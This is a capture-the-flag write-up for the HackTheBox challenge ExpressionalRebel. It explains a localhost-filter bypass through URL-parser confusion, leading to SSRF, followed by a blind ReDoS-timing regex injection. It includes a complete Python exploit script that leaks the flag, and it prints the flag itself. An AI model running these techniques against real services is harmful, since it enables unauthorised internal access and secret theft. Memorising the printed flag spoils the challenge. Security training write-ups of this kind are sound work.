---
title: 'HackTheBox - Web Challenge: ExpressionalRebel'
date: 2023-04-14T12:12:44+01:00
draft: false
---

Write up for the HackTheBox web challenge called ExpressionalRebel

Expressional Rebel was a very entertaining medium web challenge, the solution involved exploiting a url Uconfusion vulnerability along with a regex injection, something I believe most have not tinkered with (at least it wasn't the case for me!)

The vulnerable application was written in NodeJS, in this case we are provided the source code, which was crucial for this kind of challenge or it would've been pretty insane to solve!

Let's dig through some of the code of the challenge and identify vulnerabilities.

## Endpoints

There are two interesting endpoints in this application, the first one in `api.js`:

```js
router.post('/evaluate', async (req, res) => {
    const { csp } = req.body;
    try {
        cspIssues = await evaluateCsp(csp);
        res.json(cspIssues)
    } catch (error) {
        res.status(400).send();
    }
})
```

which performs the main action for this vulnerable application, evaluating a CSP.

![csp](csp.avif)

The second endpoint is found in `index.js`

```js
router.get('/deactivate',isLocal, async (req, res) => {
    const { secretCode } = req.query;
    if (secretCode){
        const success = await validateSecret(secretCode);
        res.render('deactivate', {secretCode, success});
    } else {
        res.render('deactivate', {secretCode});
    }
});
```

This endpoint validates the secret which in this case is the flag. We can see that this endpint has a `isLocal` middleware, this checks that the request is coming from localhost with the following function:

```js
module.exports = function isLocal(req, res, next) {
    if(req.socket.remoteAddress === '127.0.0.1' && req.header('host') === '127.0.0.1:1337'){
        next()
    } else {
        res.status(401);
        res.render('unauthorized');
    }
};
```

## CSP Evaluator

The csp provided to the application is evaluated using the [csp_evaluator](https://www.npmjs.com/package/csp_evaluator) node dependency, my first thought was to check for CVEs, but no luck there. 

However something else caught my eye 👀

```js
const checkReportUri = async uris => {
    if (uris === undefined || uris.length < 1) return
    if (uris.length > 1) {
        return new Finding(405, "Should have only one report-uri", 100, 'report-uri')
    }
    if(await isLocalhost(uris[0])) {
        return new Finding(310, "Destination not available", 50, 'report-uri', uris[0])
    }
    if (uris.length === 1) {
        try {
            available = await httpGet(uris[0])

        } catch (error) {
            return new Finding(310, "Destination not available", 50, 'report-uri', uris[0])
        }
    }

    return
}
```

The `checkReportUri` is called using whatever url we provide in the `reportUri` section of the CSP:

```js
parsed.directives['report-uri'];
```

However if we want to use this SSRF to reach the `/deactivate` endpoint, we must bypass the `isLocalhost` filter on line 6

```js
const isLocalhost = async (url) => {
    let blacklist = [
        "localhost",
        "127.0.0.1",
    ];
    let hostname = parse(url).hostname;
    return blacklist.includes(hostname);
};
```

## URL Confusion

URL confusion is a vulnerability which arises from the non-standardized implementations of url parsing functions. In this case we want to make sure that `isLocalhost` does not resolve our URL to have a localhost hostname, however that the `httpGet` functionality actually reaches `127.0.0.1`

```js
const httpGet = url => {
    return new Promise((resolve, reject) => {
        http.get(url, res => {
            res.on('data', () => {
                resolve(true);
            });
        }).on('error', reject);
    });
}
```

After reading this [blog post](https://snyk.io/blog/url-confusion-vulnerabilities/) about it, I started playing around with the `parse` function to try and bypass the check.

Finally I landed on the following:

```
http:\\\/127.0.0.1:1337/deactivate?secretCode=
```

If we print the object which is returned when the mentioned sting is passed to `parse` we get:

```js
Url {
  protocol: 'http:',
  slashes: true,
  auth: null,
  host: '',
  port: null,
  hostname: '',
  hash: null,
  search: '?secretCode=%22',
  query: 'secretCode=%22',
  pathname: '//127.0.0.1:1337/deactivate',
  path: '//127.0.0.1:1337/deactivate?secretCode=%22',
  href: 'http:////127.0.0.1:1337/deactivate?secretCode=%22'
}
```

`hostname` is null! We have bypassed the `isLocalhost`, additionally this is treated as a valid URL by `http.get`, letting us acheive our SSRF

## Regex Injection

The way the secret is validated is using the following function:

```js
const validateSecret = async (secret) => {
    try {
        const match = await regExp.match(secret, env.FLAG)
        return !!match;
    } catch (error) {
        return false;
    }
}
```

Is there a way we can get information about `env.FLAG` while controlling only `secret`? 

It turns out we can use complex regexes and the response time give us information about whether we got partial of the secret correctly. If you wanna learn more about this vulnerability I suggest you read: [https://diary.shift-js.info/blind-regular-expression-injection/](https://diary.shift-js.info/blind-regular-expression-injection/) . It explains this in great detail.

Using this technique we can bruteforce the flag character by character, using our SSRF to call the endpoint.

Here is the script I ended up using, mostly by modifying a PoC from the aforementioned blog post.

```py
import requests
import random
import string
import re

ENDPOINT = "http://139.59.189.31:30334"
INITIAL = "HTB{"

# constants
THRESHOLD = 2

# predicates
def length_is(n):
    return ".{" + str(n) + "}$"

def nth_char_is(n, c):
    return ".{" + str(n-1) + "}" + re.escape(c) + ".*$"

# utilities
def redos_if(regexp, salt):
    return "^(?={})(((.*)*)*)*{}".format(regexp, salt)

def get_request_duration(payload):
    payload = {
        "csp": "img-src https: data:;foobar-src 'foobar'; report-uri http:\\\/127.0.0.1:1337/deactivate?secretCode={}".format(payload)
    }

    r = requests.post(ENDPOINT + "/api/evaluate", json=payload)
    print(r.elapsed.total_seconds())
    return r.elapsed.total_seconds()

def prop_holds(prop, salt):
    return get_request_duration(redos_if(prop, salt)) > THRESHOLD

def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])

# exploit
if __name__ == '__main__':
    # generating salt
    salt = generate_salt()
    while not prop_holds('.*', salt):
        salt = generate_salt()
    print("[+] salt: {}".format(salt))
    
    # leak length
    upper_bound = 100
    secret_length = 0
    for i in range(0, upper_bound):
        if prop_holds(length_is(i), salt):
            secret_length = i            
    print("[+] length: {}".format(secret_length))
    
    S = string.printable
    black = "#&;,"
    secret = INITIAL
    for i in range(4, secret_length):
        for c in S:
            if c in black:
                continue
            if prop_holds(nth_char_is(i+1, c), salt):
                secret += c
                print("[*] {}".format(secret))
    print("[+] secret: {}".format(secret))
```

I'm sure you could optimize this script quite a bit, however after some time I got the flag!

```
HTB{b4cKtR4ck1ng_4Nd_P4rs3Rs_4r3_fuNnY}
```

## Conclusion

This was a really nice challenge that touched on some vulnerabilities which were pretty unknown to me. I hope you enjoyed it as much as I did and I hope you found this blogpost useful! 

Keep hacking! 🥷